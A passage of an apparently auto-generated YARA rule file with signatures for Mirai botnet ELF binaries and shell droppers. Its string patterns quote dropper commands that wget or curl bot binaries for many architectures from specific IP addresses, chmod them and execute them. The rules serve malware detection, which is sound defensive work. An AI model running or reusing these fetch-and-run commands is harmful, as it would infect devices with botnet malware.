      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.m68k ; /bin/busybox wget http://77.83.240.93/bot.m68k ; chmod 777 bot." ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mips ; /bin/busybox wget http://77.83.240.93/bot.mips ; chmod 777 bot." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv4l ; /bin/busybox wget http://77.83.240.93/bot.armv4l ; chmod 777 " ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i686 ; /bin/busybox wget http://77.83.240.93/bot.i686 ; chmod 777 bot." ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox wget http://77.83.240.93/bot.mipsel ; chmod 777 " ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv6l ; /bin/busybox wget http://77.83.240.93/bot.armv6l ; chmod 777 " ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__afd60801 {
   meta:
      description = "_subset_batch - file Mirai(signature)_afd60801.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "afd608010962ae77d922dbed6925f70abfd4159d8fa69bfb294194cb54eb42c9"
   strings:
      $s1 = "b%tEBQ0\\.\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b0d30069 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b0d30069.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b0d300699cdd6714233c2fd583a3862b1fd504331274f5be0554e69f676b0931"
   strings:
      $s1 = ":xsvr@M-SEARCH * HTTP" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      all of them
}

rule Mirai_signature__c8134232 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c8134232.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c8134232868449489961522cbc0cc8a46d6c44a64e07b8a05c22fcf858db7bce"
   strings:
      $s1 = ":xsvr@M-SEARCH * HTTP/1" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      all of them
}

rule Mirai_signature__c4fdffa3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c4fdffa3.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c4fdffa36b13e3742a38317302b552e0142055d028e43ef4ccbbdbfa0b208342"
   strings:
      $s1 = "vFTPjGNRGPlKeeGp" fullword ascii /* score: '9.00'*/
      $s2 = "iknncvvi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      all of them
}

rule Mirai_signature__b1d7305e {
   meta:
      description = "_subset_batch - file Mirai(signature)_b1d7305e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1d7305e5613e42a5df75803b0aa45138bff2a04974712327c1eb7bcdd610bab"
   strings:
      $s1 = "tDLL\"a" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__b2c013e1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b2c013e1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b2c013e1a80e6f3fc846031ed7e79dea445cb81615062df1f2cb36c813b9ec20"
   strings:
      $s1 = "wget http://$server_ip//$binname.$arch -O $execname" fullword ascii /* score: '27.00'*/
      $s2 = "rm -rf $execname" fullword ascii /* score: '16.00'*/
      $s3 = "chmod 777 $execname" fullword ascii /* score: '12.00'*/
      $s4 = "execname=\"cron.resgod\"" fullword ascii /* score: '12.00'*/
      $s5 = "./$execname $1" fullword ascii /* score: '12.00'*/
      $s6 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
      $s7 = "cd /tmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6962 and filesize < 1KB and
      all of them
}

rule Mirai_signature__b9661dad {
   meta:
      description = "_subset_batch - file Mirai(signature)_b9661dad.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b9661dada014b5c0fa7ccadff3e3831d2a4a129635a4f2d4cdd618e27dc1ef74"
   strings:
      $s1 = "NQ>%I%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__bad196ee {
   meta:
      description = "_subset_batch - file Mirai(signature)_bad196ee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bad196eea9ca933ff3bd1ac89076f2d7420c05d49c1500f29b1fea19d979a1e7"
   strings:
      $s1 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s2 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__d938d7d0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d938d7d0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d938d7d02789a420405ba144f214e49796696d1741b6e3a2484cb8013dae233c"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__bb9b45b7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_bb9b45b7.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bb9b45b7abc8d45c47a7e245efdde63bd9e97beead746c23637536841145482e"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.spc; curl -O http://74.48.84.6/h" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.arm; curl -O http://74.48.84.6/h" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.arc; curl -O http://74.48.84.6/h" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.ppc; curl -O http://74.48.84.6/h" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.ppc; curl -O http://74.48.84.6/h" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.arm; curl -O http://74.48.84.6/h" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.arc; curl -O http://74.48.84.6/h" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.spc; curl -O http://74.48.84.6/h" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.x86; curl -O http://74.48.84.6/h" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.m68k; curl -O http://74.48.84.6/" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.mpsl; curl -O http://74.48.84.6/" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.i468; curl -O http://74.48.84.6/" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.arm5; curl -O http://74.48.84.6/" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.sh4; curl -O http://74.48.84.6/h" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.84.6/hiddenbin/boatnet.i686; curl -O http://74.48.84.6/" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__bff314fb {
   meta:
      description = "_subset_batch - file Mirai(signature)_bff314fb.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bff314fbbc14981c43feaa5ddf2e48c926cf7902aa030de80a29ccbcd3556ce9"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.arm; curl -O http://196.251.87.166/" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.ppc; curl -O http://196.251.87.166/" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.spc; curl -O http://196.251.87.166/" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.arc; curl -O http://196.251.87.166/" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.arm; curl -O http://196.251.87.166/" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.ppc; curl -O http://196.251.87.166/" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.x86; curl -O http://196.251.87.166/" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.m68k; curl -O http://196.251.87.166" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.arm5; curl -O http://196.251.87.166" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.i686; curl -O http://196.251.87.166" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.mips; curl -O http://196.251.87.166" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.spc; curl -O http://196.251.87.166/" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.arc; curl -O http://196.251.87.166/" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.sh4; curl -O http://196.251.87.166/" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/bins/morte.mpsl; curl -O http://196.251.87.166" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__c1d2fa8c {
   meta:
      description = "_subset_batch - file Mirai(signature)_c1d2fa8c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c1d2fa8cfd763650ce5f13ca2e8018f48d3bbb0971370901cc43e75d303a6040"
   strings:
      $s1 = "cd /tmp; wget http://185.121.13.159/lol.arm -O -> .c; chmod 777 .c; ./.c roosta;" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp; wget http://185.121.13.159/lol.arm5 -O -> .c; chmod 777 .c; ./.c roosta;" fullword ascii /* score: '27.00'*/
      $s3 = "cd /tmp; wget http://185.121.13.159/lol.arm7 -O -> .c; chmod 777 .c; ./.c roosta;" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__c7ae30d1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c7ae30d1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c7ae30d124c770525118c3fa47204fb31b4ee0be5128da9bfa88ebc70c99bddc"
   strings:
      $s1 = "GET /bot.mips HTTP/1.0" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 5KB and
      all of them
}

rule Mirai_signature__c8993c8a {
   meta:
      description = "_subset_batch - file Mirai(signature)_c8993c8a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c8993c8ad7f81b7b40b38580f0f9682c988530de21dd9defae90def2eab896d9"
   strings:
      $s1 = "GET /bot.arm7 HTTP/1.0" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 4KB and
      all of them
}

rule Mirai_signature__d881a513 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d881a513.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d881a513fec2fa2c0f29411d0e69a3809a26c68ea035969d0b57f02ac36e484e"
   strings:
      $s1 = "EARCH * HTTP/1" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      all of them
}

rule Mirai_signature__cc467f82 {
   meta:
      description = "_subset_batch - file Mirai(signature)_cc467f82.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc467f82513793e223520f6360178ee6d05f439442ea54652b7cb1d714b04410"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox curl -O http://77.83.240.93/bot.ppc ; chmod 777 bot" ascii /* score: '25.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox curl -O http://77.83.240.93/bot.ppc ; chmod 777 bot" ascii /* score: '25.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox curl -O http://77.83.240.93/bot.spc ; chmod 777 bot" ascii /* score: '25.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox curl -O http://77.83.240.93/bot.spc ; chmod 777 bot" ascii /* score: '25.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm6 ; /bin/busybox curl -O http://77.83.240.93/bot.arm6 ; chmod 777 b" ascii /* score: '22.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm7 ; /bin/busybox curl -O http://77.83.240.93/bot.arm7 ; chmod 777 b" ascii /* score: '22.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i686 ; /bin/busybox curl -O http://77.83.240.93/bot.i686 ; chmod 777 b" ascii /* score: '22.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i686 ; /bin/busybox curl -O http://77.83.240.93/bot.i686 ; chmod 777 b" ascii /* score: '22.00'*/
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mips ; /bin/busybox curl -O http://77.83.240.93/bot.mips ; chmod 777 b" ascii /* score: '22.00'*/
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm4 ; /bin/busybox curl -O http://77.83.240.93/bot.arm4 ; chmod 777 b" ascii /* score: '22.00'*/
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm4 ; /bin/busybox curl -O http://77.83.240.93/bot.arm4 ; chmod 777 b" ascii /* score: '22.00'*/
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox curl -O http://77.83.240.93/bot.mipsel ; chmod 7" ascii /* score: '22.00'*/
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.m68k ; /bin/busybox curl -O http://77.83.240.93/bot.m68k ; chmod 777 b" ascii /* score: '22.00'*/
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox curl -O http://77.83.240.93/bot.mipsel ; chmod 7" ascii /* score: '22.00'*/
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i586 ; /bin/busybox curl -O http://77.83.240.93/bot.i586 ; chmod 777 b" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__d2cb9381 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d2cb9381.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d2cb9381ab6e1ec0796f6e6a9053c4aff0f55cbb4a791e9dc3167c381ad18e9d"
   strings:
      $s1 = "busybox wget http://36.50.54.209/d/akido.ppc; chmod 777 akido.ppc; ./akido.ppc android" fullword ascii /* score: '23.00'*/
      $s2 = "busybox wget http://36.50.54.209/d/akido.spc; chmod 777 akido.spc; ./akido.spc android" fullword ascii /* score: '23.00'*/
      $s3 = "busybox wget http://36.50.54.209/d/akido.arm; chmod 777 akido.arm; ./akido.arm android" fullword ascii /* score: '23.00'*/
      $s4 = "busybox wget http://36.50.54.209/d/akido.mpsl; chmod 777 akido.mpsl; ./akido.mpsl android" fullword ascii /* score: '20.00'*/
      $s5 = "busybox wget http://36.50.54.209/d/akido.mips; chmod 777 akido.mips; ./akido.mips android" fullword ascii /* score: '20.00'*/
      $s6 = "busybox wget http://36.50.54.209/d/akido.x86_64; chmod 777 akido.x86_64; ./akido.x86_64 android" fullword ascii /* score: '20.00'*/
      $s7 = "busybox wget http://36.50.54.209/d/akido.arm6; chmod 777 akido.arm6; ./akido.arm6 android" fullword ascii /* score: '20.00'*/
      $s8 = "busybox wget http://36.50.54.209/d/akido.m68k; chmod 777 akido.m68k; ./akido.m68k android" fullword ascii /* score: '20.00'*/
      $s9 = "busybox wget http://36.50.54.209/d/akido.x86; chmod 777 akido.x86; ./akido.x86 android" fullword ascii /* score: '20.00'*/
      $s10 = "busybox wget http://36.50.54.209/d/akido.arm7; chmod 777 akido.arm7; ./akido.arm7 android" fullword ascii /* score: '20.00'*/
      $s11 = "busybox wget http://36.50.54.209/d/akido.arm5; chmod 777 akido.arm5; ./akido.arm5 android" fullword ascii /* score: '20.00'*/
      $s12 = "busybox wget http://36.50.54.209/d/akido.sh4; chmod 777 akido.sh4; ./akido.sh4 android" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x7562 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__d58011db {
   meta:
      description = "_subset_batch - file Mirai(signature)_d58011db.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d58011db0b5bb21a50387d8f0d7e6a4da6fa0c9a896fb28709b23f4f47631007"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.spc; curl -O http://45.79.126" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.arc; curl -O http://45.79.126" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.arm; curl -O http://45.79.126" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.ppc; curl -O http://45.79.126" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.spc; curl -O http://45.79.126" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.arc; curl -O http://45.79.126" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.arm; curl -O http://45.79.126" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.ppc; curl -O http://45.79.126" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.mips; curl -O http://45.79.12" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.sh4; curl -O http://45.79.126" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.arm6; curl -O http://45.79.12" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.x86; curl -O http://45.79.126" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.m68k; curl -O http://45.79.12" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.arm5; curl -O http://45.79.12" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.79.126.103/hiddenbin/boatnet.i686; curl -O http://45.79.12" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__d8076608 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d8076608.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d80766087c127112ada23c59bdd24bc1f0929cad0b6b634bbdccc8c910c67437"
   strings:
      $s1 = "curl http://147.93.177.149/systemcl/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '18.00'*/
      $s2 = "curl http://147.93.177.149/systemcl/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '18.00'*/
      $s3 = "curl http://147.93.177.149/systemcl/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '18.00'*/
      $s4 = "curl http://147.93.177.149/systemcl/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '18.00'*/
      $s5 = "curl http://147.93.177.149/systemcl/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '18.00'*/
      $s6 = "curl http://147.93.177.149/systemcl/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '18.00'*/
      $s7 = "curl http://147.93.177.149/systemcl/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '18.00'*/
      $s8 = "curl http://147.93.177.149/systemcl/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '18.00'*/
      $s9 = "curl http://147.93.177.149/systemcl/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '18.00'*/
      $s10 = "curl http://147.93.177.149/systemcl/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '18.00'*/
      $s11 = "curl http://147.93.177.149/systemcl/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '18.00'*/
      $s12 = "curl http://147.93.177.149/systemcl/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7563 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__db54ecda {
   meta:
      description = "_subset_batch - file Mirai(signature)_db54ecda.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db54ecda167dcfc219197207e466655ca083eda36c52b98031f7a2ca94e1eeb7"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.arc; curl -O http://202.155.9" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.arm; curl -O http://202.155.9" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.spc; curl -O http://202.155.9" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.ppc; curl -O http://202.155.9" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.ppc; curl -O http://202.155.9" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.spc; curl -O http://202.155.9" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.arc; curl -O http://202.155.9" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.arm; curl -O http://202.155.9" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.sh4; curl -O http://202.155.9" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.i686; curl -O http://202.155." ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.arm5; curl -O http://202.155." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.i468; curl -O http://202.155." ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.x86_64; curl -O http://202.15" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.mpsl; curl -O http://202.155." ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.94.19/hiddenbin/boatnet.mips; curl -O http://202.155." ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__dc3a0e63 {
   meta:
      description = "_subset_batch - file Mirai(signature)_dc3a0e63.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dc3a0e63509a8fe5a2a8166569326f920c20ddf2d8963f0c2a784454a29ba64c"
   strings:
      $s1 = "wget http://103.149.87.64/arm7; chmod 777 arm7; ./arm7 telnet" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://103.149.87.64/arm6; chmod 777 arm6; ./arm6 telnet" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://103.149.87.64/mips; chmod 777 mips; ./mips telnet" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://103.149.87.64/mpsl; chmod 777 mpsl; ./mpsl telnet" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://103.149.87.64/arm5; chmod 777 arm5; ./arm5 telnet" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://103.149.87.64/x86; chmod 777 x86; ./x86 telnet" fullword ascii /* score: '20.00'*/
      $s7 = "wget http://103.149.87.64/arm4; chmod 777 arm4; ./arm4 telnet" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Mirai_signature__b8a1a94f_Mirai_signature__bf16b942_Mirai_signature__c7262411_Mirai_signature__c83428ec_Mirai_signature__ca_0 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b8a1a94f.elf, Mirai(signature)_bf16b942.elf, Mirai(signature)_c7262411.elf, Mirai(signature)_c83428ec.elf, Mirai(signature)_cac1190d.elf, Mirai(signature)_cc8bef06.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b8a1a94f76991f0f5c8a1679196b54c1db8f0c919644551ac3abf3604cfb7ab0"
      hash2 = "bf16b942a2775519ba0001f34dac9307572ffd363906f751fb73655cc64a345d"
